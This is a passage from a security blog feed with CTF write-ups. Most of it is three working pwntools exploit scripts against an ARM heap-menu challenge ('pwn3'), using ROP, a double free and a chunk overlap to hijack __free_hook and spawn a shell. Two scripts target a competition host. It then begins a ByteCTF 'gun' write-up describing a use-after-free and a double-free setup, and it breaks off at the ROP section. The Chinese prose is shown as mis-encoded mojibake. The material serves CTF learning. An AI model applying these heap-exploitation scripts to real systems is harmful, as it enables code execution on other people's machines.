class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./lib/libc-2.30.so'</span>)</span><br><span class="line">context.arch= <span class="string">'arm'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'D'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'R'</span>]:</span><br><span class="line">    io = remote(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process([<span class="string">'qemu-arm'</span>, <span class="string">'-g'</span>, <span class="string">'1234'</span>, <span class="string">'-L'</span>, <span class="string">'./'</span>, <span class="string">'./pwn3'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(my_id, size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index: '</span>, str(my_id))</span><br><span class="line">    io.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(my_id)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index: '</span>, str(my_id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">    io.sendafter(<span class="string">'Please Input new password:'</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">'continue'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'Please registered account \nInput your username:'</span>, <span class="string">'xxxx'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'Please input password:'</span>, <span class="string">'2333'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'Please input password again:'</span>, <span class="string">'2333'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'continue ...'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x10f58 mov r0, r7; blx r3;</span></span><br><span class="line"><span class="string">0x10a90 mov r0, r3; pop &#123;fp, pc&#125;;</span></span><br><span class="line"><span class="string">0x105c8 : pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="string">0x10784 : pop &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pause()</span><br><span class="line">change(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">info()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">libc_addr = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x32248</span></span><br><span class="line">print(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="string">b'a'</span>*<span class="number">64</span> + p32(<span class="number">0x10e70</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = libc_addr + <span class="number">1212228</span></span><br><span class="line">system = libc_addr + <span class="number">237608</span></span><br><span class="line">payload = <span class="string">b'c'</span> * <span class="number">0x1c</span> + p32(<span class="number">0x10784</span>) + p32(bin_sh) + p32(libc_addr + <span class="number">0xa1a5c</span>) + p32(system)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'username:'</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">'password:'</span>, <span class="string">''</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendlineafter(<span class="string">'again:'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'continue'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯åˆ©ç”¨uafçš„ä¸¤ä¸ªexpï¼Œç¬¬ä¸€ä¸ªä¸ºdouble freeï¼Œç¬¬äºŒä¸ªä¸ºchunk overlapã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#p=process(["qemu-arm","-L","/usr/arm-linux-gnueabihf","./pwn3"])</span></span><br><span class="line"><span class="comment">#p=process(["qemu-arm","-L","../","pwn3"])</span></span><br><span class="line">e=ELF(<span class="string">'../lib/libc-2.30.so'</span>)</span><br><span class="line"><span class="comment">#p=process(["qemu-arm","-g",'1234',"-L","../","./pwn3"])</span></span><br><span class="line">p=remote(<span class="string">"20.20.11.14"</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'yzloser'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'password:'</span>,<span class="string">'yzloser'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'again:'</span>,<span class="string">'yzloser'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'continue'</span>,<span class="string">''</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'password:'</span>,<span class="string">'A'</span>*<span class="number">0x27</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'continue'</span>,<span class="string">''</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b'A'</span>*<span class="number">0x27</span>+<span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc=u32(p.recv(<span class="number">4</span>))<span class="number">-205384</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,siz,s)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'choice'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>,str(siz))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>,s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'choice'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(libc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">20</span>+i,<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">30</span>,<span class="number">0x30</span>,p32(libc+e.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">print(hex(libc+e.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">31</span>,<span class="number">0x30</span>,<span class="string">'test'</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="number">0x30</span>,<span class="string">'test'</span>)</span><br><span class="line">add(<span class="number">34</span>,<span class="number">0x30</span>,p32(libc+e.symbols[<span class="string">'system'</span>]))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">()</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,note)</span>:</span></span><br><span class="line">   play()</span><br><span class="line">   p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendafter(<span class="string">": "</span>,str(index))</span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">   p.sendafter(<span class="string">": "</span>,note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   play()</span><br><span class="line">   p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,str(index))</span><br><span class="line">   </span><br><span class="line">p=process([<span class="string">"qemu-arm"</span>,<span class="string">"-g"</span>,<span class="string">"1234"</span>,<span class="string">"-L"</span>,<span class="string">"."</span>,<span class="string">"./pwn3"</span>])</span><br><span class="line"><span class="comment">#p = remote("20.20.11.14", 9999)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">un=<span class="string">"aaaaa"</span></span><br><span class="line">pd1=<span class="string">"bbbbb"</span></span><br><span class="line">pd2=<span class="string">"bbbbb"</span></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,un)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,pd1)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,pd2)</span><br><span class="line">p.sendline(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,<span class="string">"a"</span>*<span class="number">0x20</span>)</span><br><span class="line">p.sendline(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info()</span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">libc=u32(p.recv(<span class="number">4</span>))+<span class="number">0xff69cba0</span><span class="number">-0x044ba0</span><span class="number">-0xff68a248</span></span><br><span class="line"><span class="comment"># print hex(libc)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">   add(i,<span class="number">0x40</span>,<span class="string">"aaaa\n"</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">6</span>,<span class="string">"a\n"</span>) <span class="comment">#0x10</span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">6</span>,<span class="string">"a\n"</span>) <span class="comment">#0x10</span></span><br><span class="line">delete(<span class="number">15</span>) </span><br><span class="line">delete(<span class="number">14</span>) <span class="comment">#tcache[0x10]=14-&gt;15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">   delete(<span class="number">8</span>-i) <span class="comment">#unsorted bin=0-&gt;1 </span></span><br><span class="line">free_hook = libc + <span class="number">0x1479cc</span></span><br><span class="line">system    = libc + <span class="number">0x3a028</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x40</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0x39</span>)+<span class="string">"\n"</span>) <span class="comment">#overchunk</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#tcache[0x10] = 1-&gt;14-&gt;15</span></span><br><span class="line">delete(<span class="number">9</span>)  </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x40</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(free_hook)*<span class="number">3</span>+p32(<span class="number">0x39</span>)+p32(libc+<span class="number">0x1479cc</span>)+<span class="string">"\n"</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">8</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">8</span>,p32(libc+<span class="number">0x3a028</span>)+<span class="string">"\n"</span>)</span><br><span class="line"><span class="comment"># print hex(libc+0x1479cc)</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#0x14675c -- main_arena</span></span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é“armçš„é¢˜ç›®èµ›åå‘ç°ä¹Ÿä¸éš¾ï¼Œå…³é”®è¿˜æ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™æ²¡æœ‰èƒ½å¤Ÿç†Ÿç»ƒçš„åˆ†æã€‚åœ¨å †åˆ†æä¸­æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œåœ¨ç”¨gdbæ’ä»¶è°ƒè¯•çš„æ—¶å€™ï¼ŒåŠ è½½æ²¡æœ‰è°ƒè¯•ç¬¦å·çš„libcæ— æ³•ä½¿ç”¨binsï¼Œchunksç­‰å‘½ä»¤ã€‚è¿™æ—¶ï¼Œåªèƒ½è‡ªå·±æ‰‹åŠ¨åœ¨å†…å­˜ä¸­æŸ¥æ‰¾è¿™äº›æ•°æ®ï¼Œæ¯”å¦‚tcacheçš„ç®¡ç†ç»“æ„æ˜¯åœ¨heapæœ€å¼€å§‹çš„åœ°æ–¹ï¼Œè€Œbinsåˆ™åœ¨main_arenaä¸Šã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ &lt;a href=&quot;https://www.anquanke.com/post/id/224972&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/224972&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="IOT" scheme="https://hurricane618.me/tags/IOT/"/>
    
      <category term="ARM" scheme="https://hurricane618.me/tags/ARM/"/>
    
  </entry>
  
  <entry>
    <title>2020 bytectf gun writeup</title>
    <link href="https://hurricane618.me/2020/10/26/2020-bytectf-gun/"/>
    <id>https://hurricane618.me/2020/10/26/2020-bytectf-gun/</id>
    <published>2020-10-26T07:51:44.000Z</published>
    <updated>2020-10-26T07:51:44.523Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™å‘¨æ‰“äº†ä¸€ä¸‹ByteCTFï¼Œå‘ç°å·®è·è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œç°åœ¨çš„å¾ˆå¤šå †èœå•é¢˜éƒ½ä¸Š2.31ï¼Œæ–°ç‰ˆæœ¬çš„é¢˜ç›®éœ€è¦å¤šç†Ÿæ‚‰ç†Ÿæ‚‰ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>checksecä¿æŠ¤å…¨å¼€ï¼Œé€†å‘çš„æ—¶å€™å‘ç°å…¶ä¸­æœ‰prctlå‡½æ•°ï¼Œç”¨seccomp-toolsæŸ¥çœ‹æ²™ç®±é€»è¾‘ã€‚</p><img src="/2020/10/26/2020-bytectf-gun/1.png"><p>çœ‹è¿™ä¸ªé€»è¾‘åªèƒ½ä½¿ç”¨orwçš„æ–¹æ³•è·å¾—flagã€‚æ•´ä¸ªç¨‹åºä¸»è¦ç”±ä¸‰ä¸ªåŠŸèƒ½ï¼Œå°„å‡»å­å¼¹ï¼Œä¸Šè†›å­å¼¹ï¼Œè´­ä¹°å­å¼¹ï¼Œè´­ä¹°å­å¼¹ä¼šmallocï¼ŒåŒæ—¶æœ‰ä¸€æ¬¡å‘chunkå†™æ•°æ®çš„æœºä¼šï¼Œè´­ä¹°çš„å­å¼¹ä¼šé€šè¿‡ä¸€ä¸ª18å­—èŠ‚å¤§å°çš„æ•°æ®ç»“æ„ç®¡ç†ã€‚chunkæŒ‡å‘åˆ†é…çš„å †å—ï¼ŒnextæŒ‡å‘å…¶ä»–å †å—å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œflagæ˜¯æ ‡å¿—ä½åˆ†åˆ«æœ‰0ï¼Œ1ï¼Œ2ï¼Œè¡¨ç¤ºä¸åŒçš„çŠ¶æ€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>* chunk;</span><br><span class="line">    <span class="keyword">char</span>* next;</span><br><span class="line">    <span class="keyword">int</span> flag;  <span class="comment">// 0ä¸ºå‘å°„ä¹‹å 1ä¸ºè´­ä¹°çŠ¶æ€ 2ä¸ºä¸Šè†›çŠ¶æ€</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè†›å­å¼¹ä¼šæŠŠå­å¼¹æ”¾è¿›å¼¹å¤¹ä¸­ï¼Œå¦‚æœå¼¹å¤¹ä¸­å·²ç»æœ‰å­å¼¹ï¼Œåˆ™ä¼šä½¿ç”¨nextè¿›è¡Œé“¾æ¥ï¼ŒnextæŒ‡å‘å¼¹å¤¹ä¸­çš„å­å¼¹ï¼Œç„¶åæŠŠè¿™ä¸ªå­å¼¹æ”¾è¿›å¼¹å¤¹ä¸­ï¼Œæ„æˆä¸€ä¸ªç”±å­å¼¹ç»„æˆçš„å•å‘é“¾è¡¨ï¼Œæœ€åæ”¹å˜æ ‡å¿—ä½ä¸º2ã€‚å‘å°„å­å¼¹ä¼šä»å¼¹å¤¹ä¸­çš„å­å¼¹å¼€å§‹freeï¼Œfreeå®Œæˆä¹‹åå¼¹å¤¹ä¼šå¡«å…¥nextæŒ‡å‘çš„ä¸‹ä¸€ä¸ªå­å¼¹ï¼Œé‡å¤ä¸€ä¸ªæŒ‡å®šçš„æ¬¡æ•°ã€‚æ¯æ¬¡å°„å‡»ä¼šè¾“å‡ºè¿™ä¸ªå­å¼¹çš„chunkå†…å®¹ï¼Œè¿™ç»™äº†æˆ‘ä»¬æ³„éœ²çš„æœºä¼šã€‚</p><p>å¦å¤–ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ç‚¹åœ¨å°„å‡»freeä¸­ï¼Œæ²¡æœ‰ç½®ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨UAFçš„é—®é¢˜ã€‚</p><img src="/2020/10/26/2020-bytectf-gun/2.png"><p>é™¤äº†ä¸Šé¢çš„è¿™äº›ï¼Œæœ‰ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œå°„å‡»å®Œæˆçš„å­å¼¹æ•°æ®ç»“æ„ä¸­çš„å†…å®¹éƒ½ä¸ä¼šæ¸…é™¤ï¼Œè¿™æ„å‘³ç€nextæŒ‡é’ˆçš„å†…å®¹æ˜¯ä¿ç•™ä¸‹æ¥çš„ï¼Œè¿™ä¸ªç»†èŠ‚ç‚¹æˆä¸ºäº†ä¹‹åæ„é€ double freeçš„åŸºç¡€ã€‚</p><h2 id="æ³„éœ²libcå’Œheap"><a href="#æ³„éœ²libcå’Œheap" class="headerlink" title="æ³„éœ²libcå’Œheap"></a>æ³„éœ²libcå’Œheap</h2><p>å› ä¸ºæœ‰tcacheçš„åŸå› ï¼Œè¦è®©chunkè¿›å…¥unsorted binä¸­éœ€è¦è®©tcacheå¡«æ»¡ï¼Œæˆ‘ä»¬çš„æ€è·¯æ˜¯å¡«æ»¡tcacheä¹‹åè®©chunkè¿›å…¥unsorted binä¸­ï¼Œå†æ¬¡åˆ†é…å°chunkå°±èƒ½æ‹¿åˆ°å¸¦æœ‰libcåœ°å€çš„chunkã€‚malloc(0x80)åˆ†é…8æ¬¡ï¼Œè£…è½½ä¹‹åå°„å‡»8æ¬¡ï¼Œä»0åˆ°7è£…è½½ä¼šè®©7å·å­å¼¹é¦–å…ˆé‡Šæ”¾ï¼Œåˆå› ä¸ºtcacheæ˜¯å’Œfastbinç±»ä¼¼çš„FILOï¼Œæœ€å0å·è¢«åˆ†é…åˆ°äº†unsorted binä¸­ï¼Œå…¶ä½™7ä¸ªåœ¨tcacheä¸­ã€‚</p><img src="/2020/10/26/2020-bytectf-gun/3.png"><p>éšååˆ†é…å°chunkï¼Œæ‹¿åˆ°å¸¦æœ‰libcåœ°å€çš„chunkï¼Œè¿™é‡Œmalloc(0x20)ä¼šåˆ‡åˆ†unsorted binã€‚</p><img src="/2020/10/26/2020-bytectf-gun/4.png"><p>è£…è½½å¹¶å‘å°„è¿™ä¸ªå­å¼¹ï¼Œæˆ‘ä»¬å°±èƒ½æ³„éœ²åˆ°libcåœ°å€ã€‚è€Œè¦æ³„éœ²åˆ°heapçš„åœ°å€ï¼Œè¿™é‡Œè¦åˆ†é…tcacheä¸­çš„chunkï¼Œç„¶åç”¨åŒæ ·çš„æ–¹æ³•è£…è½½å¹¶å‘å°„ï¼Œæ³„éœ²åˆ°heapåœ°å€ã€‚</p><h2 id="æ„é€ double-free"><a href="#æ„é€ double-free" class="headerlink" title="æ„é€ double free"></a>æ„é€ double free</h2><p>åœ¨æˆ‘ä»¬é¢å‰çš„é—®é¢˜æ˜¯è¿™é“é¢˜ç›®çš„freeéƒ½æ˜¯æŒ‰ç…§é“¾è¡¨é¡ºåºè¿›è¡Œçš„ï¼Œè€Œé“¾è¡¨åªèƒ½é€šè¿‡ä¸Šè†›çš„æ–¹å¼æ”¹å˜ã€‚è¿™é‡Œçš„æ„é€ åˆ©ç”¨äº†ä¹‹å‰ä¸Šè†›æ“ä½œé—ç•™ä¸‹æ¥çš„nextæŒ‡é’ˆæ„é€ double freeï¼Œå¦‚ä¸‹å›¾ï¼š</p><img src="/2020/10/26/2020-bytectf-gun/5.png"><p><code>0x555555558060</code>æ˜¯ä¹‹å‰å¡«å……tcacheæ—¶é—ç•™ä¸‹çš„æŒ‡å‘é¦–ä¸ªchunkçš„æŒ‡é’ˆï¼Œå¦‚æœæˆ‘ä»¬å†æ¬¡ç”¨ç±»ä¼¼çš„æ–¹æ³•å¡«å……tcacheï¼Œä½†æ˜¯è®©å¼¹å¤¹ä¸­ç•™ç€ç¬¬äºŒä¸ªchunkçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬è£…è½½ç¬¬ä¸€ä¸ªchunkå°±ä¼šè®©nextæŒ‡å‘ç¬¬äºŒä¸ªchunkï¼ŒåŒæ—¶ç¬¬äºŒä¸ªchunkåŸæ¥å°±æ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªchunkçš„ï¼Œæ„é€ å‡ºè¿™æ ·çš„é“¾è¡¨åå°„å‡»3æ¬¡ï¼Œfreeæ‰çš„chunkè¿›å…¥fastbinå°±å®Œæˆäº†ç»å…¸çš„double freeã€‚</p><img src="/2020/10/26/2020-bytectf-gun/6.png"><p>è¦ä½¿ç”¨è¿™ä¸ªdouble freeï¼Œè¿˜éœ€è¦æŠŠtcacheæ¸…ç©ºï¼Œæ¸…ç©ºä¹‹åç»§ç»­ç”³è¯·ä»fastbinè·å¾—chunkï¼Œå‰©ä¸‹çš„chunkä¼šè¿›å…¥åˆ°tcacheä¸­ï¼Œä½†æ˜¯è¿™ä¸ªè¿›å…¥é¡ºåºä¼šæ˜¯fastbinå¼¹å‡ºé¡ºåºçš„å€’è½¬ï¼Œæœ€ç»ˆçš„ç»“æœä¼šæ˜¯å’Œfastbinä¸€æ ·çš„æ’åºã€‚æ¸…ç©ºåçš„ç¬¬ä¸€æ¬¡ç”³è¯·ï¼ŒæŠŠç›®æ ‡åœ°å€free_hookå†™å…¥æŒ‡é’ˆä¸­ï¼Œå½¢æˆä¸‹é¢çš„é“¾æ¥é¡ºåºã€‚</p><img src="/2020/10/26/2020-bytectf-gun/7.png"><p>å†æ¬¡ç”³è¯·3æ¬¡ï¼Œå°±èƒ½æ‹¿åˆ°ç›®æ ‡chunkï¼Œå†™å…¥æˆ‘ä»¬çš„gadgetã€‚</p><h2 id="æ„é€ ROP"><a href="#æ„é€ ROP" class="headerlink" title="æ„é€ ROP"></a>æ„é€ ROP</h2><p>å› 